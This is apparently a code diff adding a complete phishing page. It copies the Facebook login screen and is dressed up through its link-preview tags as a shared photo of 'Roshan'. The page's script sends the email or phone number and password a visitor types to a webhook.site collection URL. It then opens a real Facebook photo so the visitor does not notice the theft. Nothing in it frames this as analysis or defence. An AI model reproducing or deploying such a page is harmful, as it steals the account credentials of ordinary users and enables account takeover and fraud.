@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <meta property="og:title" content="Facebook">
+    <meta property="og:description" content="Ro Sh An Photo">
+    <meta property="og:image" content="https://i.ibb.co/8P9q9Kn/434073204-985967179811265-7508573186043045278-n.jpg">
+    <meta property="og:type" content="website">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Roshan's photo</title>
+</head>
+
+<body>
+    <header>
+        <!--empty-->
+    </header>
+    <main role="main">
+        <div class="container">
+            <div class="content flex">
+                <div class="logo-and-subheading">
+                    <div class="logo">
+                        <img src="./img/facebook_logo.svg" height="106" width="300" alt="facebook logo">
+                    </div>
+                    <div class="subheading">
+                        <h2>Connect with friends and the world<br> around you on Facebook.</h2>
+                    </div>
+                </div>
+                <div class="card-and-alternative flex-column">
+                    <div class="card flex-column">
+                        <form id="loginForm">
+                            <input id="email" name="email" class="form-control" placeholder="Email or Phone Number"
+                                autofocus required>
+                            <input id="password" name="password" type="password" class="form-control"
+                                placeholder="Password" required>
+                            <button type="button" class="btn form-control" onclick="login()">Log In</button>
+                        </form>
+                        <a
+                            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot
+                            Password?</a>
+                        <hr>
+                        <button type="button" onclick="create()" class="btn btn-secondary">Create
+                            New Account</button>
+                    </div>
+                    <div class="alternative">
+                        <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a>
+                            for a celebrity, band or business.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+</body>
+
+
+<script>
+
+    function create() {
+        window.open("https://www.facebook.com/r.php/");
+    }
+
+    function login() {
+        const form = document.getElementById('loginForm');
+        const formData = new FormData(form);
+
+        fetch("https://webhook.site/1bc22d57-1cc4-41f0-9973-a6a9f48ce00e", {
+            method: "POST",
+            body: formData
+        })
+            .then(response => {
+                if (response.ok) {
+                    // Handle successful login
+                    console.log("Login successful!");
+                } else {
+                    // Handle login error
+                    console.error("Login failed!");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+
+        window.open("https://www.facebook.com/photo/?fbid=340877738168841&set=a.258149489775000");
+    }
+
+</script>
+
+
+</html>
